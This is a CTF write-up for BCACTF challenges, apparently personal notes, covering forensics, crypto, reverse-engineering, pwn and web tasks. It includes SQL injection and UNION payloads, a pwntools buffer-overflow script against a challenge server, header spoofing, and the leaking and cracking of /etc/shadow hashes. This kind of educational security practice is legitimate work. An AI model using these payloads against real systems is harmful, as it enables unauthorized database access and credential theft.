# List of solved challenges
- aetherion-dynamics
- babys-first-foren
- bcagpt
- discord
- dots-and-dashes
- duck-cord
- flag-plus
- freebee
- hamsta
- interpreted-arduino
- manipulate-spreadsheet
- many-time-pad
- not_today
- password-protected
- postfix-calculator
- unionized




## Aetherion Dynamics
#forensics

```text
Aetherion Dynamics is a cutting-edge company operating under the highest levels of secrecy.

We've managed to get our hands on one of their top-secret memos, but it's redacted!

You need to help us find their secret password.
```

- The challenge provides a pdf file with a redacted section.
	![[sources/aetherion-dynamics/pdf_overview.png]]

- There are multiple ways of solving this, all of them relying on the fact that the redacted information and the redaction are two different components which can be separated. 
- Using a tool such as `pdftohtml`, we can extract all the relevant information from the file and convert it to different formats. By default, it converts the pdf to a jpg which will contain the redacted information:

![[sources/aetherion-dynamics/pdftohtml.png]]


![[sources/aetherion-dynamics/solved.png]]


## Babys First Foren
#forensics 

```text
I found this beginner's guide to forensics.
```

- A simple challenge involving 3 steps:
	- Exiftool to find the first part of the flag:
		![[sources/babys-first-foren/first_step.png]]
	 - Binwalk to extract hidden files in the png, find a text file which contained the second part of the flag on the last line:
		![[sources/babys-first-foren/second_step.png]]
	 - To detect the last part of the flag, I used an online service (https://stylesuxx.github.io/steganography/) that performed LSB Steganography decoding:
	     ![[sources/babys-first-foren/third_step.png]]
	    - Merged together, these 3 parts give us the final flag.



### Bcagpt
#web

```text
OpenAI API credits are really expensive, so I decided to make my own large
language model.
I told it the flag, but it promised it won't tell you.
```

- At first glance, this challenge might seem NLP related, but it's just a trick :D 
- We have the server source code. Upon inspection, this part is the central point: 
 ```js
app.post('/ai', urlencodedParser, (req, res) => {

	let kwds = req.body.query ?? '%';
	let msgs = [{author: 'you', message: kwds=="%" ? 'No query found' : kwds}];
	db.serialize(() => {
		db.get(`SELECT response_text FROM response WHERE response_keywds !='${kwds}' ORDER BY resp_order, RANDOM() LIMIT 1`, (err, row) => {

		if (err) {
			console.error(err.message);
			res.render('index', {error: err.message});
		} else {
			let resp = row?.response_text?.replace("{}",req.body.query) ?? "AI brain overheated";
			msgs.push({author: 'BCAGPT', message: resp});
			res.render('index', {
			messages: msgs
			});
		}
		return;
	});
});
return
```

- No input sanitation of the user-controlled 'kwds' variable -> SQL Injection. When looking at the training dataset, each and every response has the `resp_order` equal to 1, only one entry has a response entry equal to 2. 
	- By abusing the injection vuln, we can trigger the particular response and get the flag
![[sources/bcagpt/solve.png]]

### Discord
#misc
```
Join our Discord Server to find a team, talk to other players, and more.
There might also be a flag somewhere. Maybe.
```

- Not much to say here, just join the Discord server :)

### Dots and Dashes
#crypto
```text
My friend sent me a message by flashing his flashlight, and I recorded it using .'s and -'s. Can you help me decode it?
```

- First instinct was to decipher the code as Morse, but that did not work
- Since there are only 2 variables, we can guess it is a binary encoding. The following CyberChef recipe was used:

![[sources/dots-and-dashes/recipe.png]]

### Duck Cord
#pwn
```text
The ducks and I have been working on our latest communications app: `Duck
Cord`

It's more duck-focussed than other communication apps these days...
```

- Very fun challenge involving memory exploitation.

- A `.c` source is provided, the interesting part lies here:
```c
typedef struct {
	char name[MAX_NAME_LEN];
	union {
		uint32_t tag_raw;
		char tag[4];
	};
} user_t;

typedef struct {
	user_t* author;
	char content[100];
	uint16_t time_sent; // in minutes
} msg_t;

user_t system_user = {
	.name = "Agent Duck",
	.tag_raw = SYSTEM_TAG // #0000
};

{...}

if (msg->author->tag_raw == SYSTEM_TAG) {
	if (self.tag_raw == SYSTEM_TAG) 
		print_msg(msg);

{...}

```

- If we create a user with the tag name equal to the tag name of the 'admin' user, we can read the admin user message, which is the flag.

- To do this, I created a simple python script:

```python
"""
Overflow the "name" field from the user_t struct and add an '0x30303030' (#0000) tag so we can read system messages
"""
from pwn import *

payload = str("Ducky Duck" * 5)[:32].encode('utf-8') + p64(0x30303030)
# print(payload)
c = remote('challs.bcactf.com', 30184)
c.sendline(payload)
c.interactive()
```

### Flag Plus
#web 
```text
I've been trying to find a flag on this site,
but it looks like you have to pay to get it...
```

- Web challenge that exposed the vulnerabilities that may arise when validation of origin is implemented solely using HTTP headers, which are user-controlled:
- Change the `Referer` header to come from \<host>/paid.html instead of \<host>/free.htm
- No source code was provided and at the time of writing this, the service has been shut down so no pics for this one. :(


### Freebee
#web 
```
I want to read this really cool article, but they have a paywall
Can you get me around that?
```

- Similar story to the previous challenge.
- Removing the unwanted DOM elements using the developer console leads us to a `svg` tag which contains the flag. 

### Hamsta
#rev 
```txt
I forgot the flag, yet, somehow my hamster remembers it.
The further he runs, the more of the flag is revealed!
I did my best to add limits to prevent him from getting
tired out and revealing the flag, hopefully there's no bugs
```
- A remote hamster can run a certain distance imposed by the user (capped by a server imposed `MAX_DISTANCE_VALUE`)
- At each iteration, a new letter of the flag is revealed. 
- The problem is that the max distance is not the length of the flag
![[sources/hamsta/main_screen.png]]

![[sources/hamsta/max_distance_cap.png]]

- The flag is longer than 11 characters, so we have to input negative values so the hamster will reveal all the flag:
![[sources/hamsta/flag.png]]

### Interpreted Arduino
#rev 
```
I created an Arduino simulator CLI you can interact with at runtime.
You can run it with code to start off, and then its built in interpreter will let you run code as you go.
It's supposed to print out the flag but it's not working. Can you help me figure out what's wrong?
I ran the `main.ino` file on the board, included below with the flag redacted.
```
- We are given a simple Arduino program which prints the flag at the start of the program (in the setup() function) and then acts as a assisted CLI. To read the flag, we need to reset the program, to trigger the setup() function again:
![[sources/interpreted-arduino/solve.png]]

### Manipulate Spreadsheet
#misc 
```
They said the flag was in [this spreadsheet](https://docs.google.com/spreadsheets/d/10UYPl1kzuSTLJbN6kLkJR4aVFxo3nXUrKIiLLTQyOb8/), but it appears completely empty to me! Can you help me find it?
```

- We are given a excel file with bleached values.
- First thing is to make these values visible:
![[sources/manipulate-spreadsheet/make_visible.png]]

- Sort the indexes and construct the flag step by step by concatenating each found letter:

![[sources/manipulate-spreadsheet/sort.png]]


### Many Time Pad
#crypto 
```text
I heard that one-time pads are unbreakable! I'm going to use it for everything!!
```


```python
from Crypto.Util.number import long_to_bytes, bytes_to_long

def rev_enc(plain, key):
	return long_to_bytes( bytes_to_long(plain) ^ bytes_to_long(key) )
"""
* C_FLAG = P_FLAG xor Key
* C_Grocery = P_Grocery xor Key

This is a known plaintext attack:
1. We know the plaintext grocery list,
2. We also know the ciphertext of the grocery list -> Key is found (because of the xor proprieties).
3. Once key in found, we have P_FLAG, just find C_FLAG
"""

C_FLAG = open("many-time-pad.out", "rb").read()
C_Grocery = open("grocery-list.out", "rb").read()
P_Grocery = b"I need to buy 15 eggs, 1.7 kiloliters of milk, 11000 candles, 12 cans of asbestos-free cereal, and 0.7 watermelons."

key = rev_enc( C_Grocery, P_Grocery )
print( rev_enc(C_FLAG, key) )
```


### Not Today
#web 
```
This website gives you the flag sometimes. When it feels like it. In a special
time zone.
Time Zone: `GMT+∀ (BCA Special Time)`
Date Time: `Wed Jun 07 2023 06:09:42`
```

- Send a POST request to the `api` endpoint specifying the requested date and time zone ( the ones used in the challenge description )


### Password Protected
#misc 
```text
Can you help log Jon Wilkie back into his account?
```

- This was my favorite challenge from this CTF.
- The regex for checking the password hash was faulty. When entering the name of the user, we get part of his hash:

![[sources/password-protected/initial.png]]

- Further padding to the username reveals new username and new hashes -> we can progressively get all the `/etc/shadow` file contents

- After getting the contents of jonwilkie, use hashcat or john the ripper to crack his hash.

![[sources/password-protected/hashes.png]]


### Postfix Calculator
#misc 
```text
Mr. Wang left some tricks behind in his Intro to CS labs before leaving BCA. Can you use the Postfix lab to get the flag?
```

- Standard python sandbox escape.
![[sources/postfix-calculator/proof.png]]
- Note: I used the second print to pass the necessity of two operands. 

###  Unionized
#web 
```text
I was messing with some SQL, so I made this basic website. It only
stores school data...probably.
```

- The search form has a vulnerability that allows users to exploit the database and access all its data. To find the hidden table and its column names, use the input `' UNION select sql FROM sqlite_schema --'`. With the information obtained, users can then input `' UNION SELECT unkn0wn FROM mystery--` to retrieve the flag, which will be displayed among the school names.

